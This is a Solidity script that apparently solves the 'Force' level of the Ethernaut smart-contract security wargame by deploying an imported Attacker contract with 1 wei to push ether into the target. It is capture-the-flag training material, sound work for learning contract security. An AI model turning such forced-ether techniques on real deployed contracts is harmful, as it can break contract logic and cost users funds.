// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Force} from "ethernaut/levels/Force.sol";
import {Attacker} from "~/helpers/Force.sol";

contract Check is CheckScript("FORCE") {}

contract Solve is SolveScript("FORCE") {
    Force target;

    constructor() {
        target = Force(instance);
    }

    function attack() public override {
        new Attacker{value: 1}(payable(address(target)));
    }
}
